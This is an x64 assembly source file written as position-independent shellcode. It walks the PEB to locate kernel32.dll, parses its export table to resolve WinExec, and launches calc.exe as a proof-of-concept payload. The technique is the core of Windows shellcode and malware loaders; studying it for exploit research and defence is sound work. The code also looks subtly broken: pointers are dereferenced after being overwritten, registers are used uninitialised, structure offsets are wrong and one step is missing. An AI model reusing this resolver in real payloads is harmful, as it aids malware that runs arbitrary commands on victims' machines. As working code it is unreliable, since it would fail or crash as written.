bits 64
default rel
global main

section .text

main:
    ; --- Step 1. Locate Kernel32.dll in the process environment block
    ;
    xor rax, rax
    mov rax, [gs:0x60]          ; rax = PEB
    mov rax, [rax + 0x18]       ; rax = PEB->LDR
    mov rax, [rax + 0x10]       ; rax = PEB->Ldr->InLoadOrderModuleList->Flink [this.exe]
    lea rcx, [rel kernel32]     ; rcx = &"KERNEL32.DLL"
get_base_dll_name:
    mov r15, rax                ; r15 = PEB->Ldr->InLoadOrderModuleList->Flink
                                ; - Must preserve the value of rax which holds current position in Ldr linked list
    mov rdx, [rax + 0x60]       ; rdx = LDR_DATA_TABLE_ENTRY->BaseDllName 
                                ; - Push past Blink (0x8 bytes) LDR_DATA_TABLE_ENTRY base, access BaseDllName (0x58 bytes)
    sub rsp, 0x28               ; Add 0x28 bytes for shadowspace
    call wstrcmp                 ; Call strcmp(rcx="KERNEL32", rdx=LdrDataTableEntry.BaseDllName)
    add rsp, 0x28               ; Remove shadow space
    cmp rax, 0                  ; Check if strcmp was successful
    je found_kernel_32          ; Continue if kernel32 was found
    mov rax, [rax]              ; Deref forward link (Flink) to next LDR_DATA_TABLE_ENTRY (Dll) if not found
    jmp get_base_dll_name       ; Return to top & get base dll name
    
    ; --- Step 2. Locate the export directory in kernel32.dll
    ;
found_kernel_32:
    mov r15, [r15 + 0x30]       ; r15 = (LDR_DATA_TABLE_ENTRY)Kernel32.DllBase
    mov r14d, [r15 + 0x3C]      ; r14d = e_lfanew (Kernel32 Dos Header)
    add r14, r15                ; r14 = IMAGE_NT_HEADER
    add r14, 0x88               ; r14 = NtHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
    mov r14d, [r14]             ; r14d = IMAGE_DIRECTORY_ENTRY_EXPORT.VirtualAddress (RVA)
    add r14, r15                ; r14 = IMAGE_EXPORT_DIRECTORY
    
    ; --- Step 3. Search the export dir for WinExec function address
    ;    
begin_function_search:
    lea rcx, [rel winexec]  ; rcx = &"WinExec"
    mov r13d, [r14 + 0x20]  ; r13d = ExportDirectory.AddressOfNames RVA
    add r13, r15            ; r13 = ExportDirectory.AddressOfNames
    mov edx, [r13 + r12 * 4]; edx = Function Name RVA
    add rdx, r15            ; rdx = Function Name
    sub rsp, 0x28
    call strcmp             ; strcmp(rcx="WinExec", rdx=FunctionName)
    add rsp, 0x28               
    cmp rax, 0
    je found_function
    cmp r12, [r14 + 0x14]   ; r14 + 0x14 = ExportDirectory.NumberOfFunctions
                            ; Checking if we've reached the last function export
    je export_limit_reached 
    inc r12                 ; increment position within the AddressOfNames RVA array
    jmp begin_function_search
export_limit_reached:
    ret
    
    ; --- Step 5: Execute the winexec function 
    ;
found_function:
    mov r11d, [r14 + 0x24]      ; r11 = ExportDirectory.AddressOfOrdinals RVA
    add r11, r15                ; r11 = ExportDirectory.AddressOfOrdinals
    mov ax, [r11 + r12 * 2]     ; ax = Target Function Ordinal
    mov r10d, [r14 + 0x1C]      ; r10d = AddressOfFunctions RVA
    add r10, r15                ; r10 = ExportDirectory.AddressOfFunctions
    mov ebx, [r10 + r12 * 4]    ; ebx = Target Function RVA
    add rbx, r15                ; rbx = Target Function (WinExec)
    lea rcx, [rel commandline]  ; rcx = lpCmdLine
    mov rdx, 1                  ; rdx = uCmdShow (SW_SHOWNORMAL)
    sub rsp, 0x28
    call rbx                    ; WinExec("calc.exe", SW_SHOWNORMAL)
    ret

; ansi string comparison function
; strcmp(rcx, rdx)
strcmp:
    mov rax, 1
    mov r10b, [rcx + rsi]
    mov r11b, [rdx + rsi] 
    cmp r10b, r11b
    jne strcmp_not_found
    cmp r10b, 0
    jne strcmp_epilogue
    cmp r11b, 0
    je strcmp_found
strcmp_epilogue:
    inc rsi
    jmp strcmp
strcmp_not_found:
    xor rsi, rsi
    ret
strcmp_found:
    xor rsi, rsi
    xor rax, rax
    ret

; wide string comparison function
; wstrcmp(rcx, rdx)
wstrcmp:
    mov r10w, [rcx + rsi * 2]
    mov r11w, [rdx + rsi * 2] 
    cmp r10w, r11w
    jne wstrcmp_not_found
    cmp r10w, 0
    jne wstrcmp_epilogue
    cmp r11w, 0
    je wstrcmp_found
wstrcmp_epilogue:
    inc rsi
    jmp wstrcmp
wstrcmp_not_found:
    xor rsi, rsi
    ret
wstrcmp_found:
    xor rsi, rsi
    xor rax, rax
    ret

kernel32:
    dw __utf16__("KERNEL32.DLL"), 0
winexec:
    db "WinExec", 0
commandline:
    db "calc.exe", 0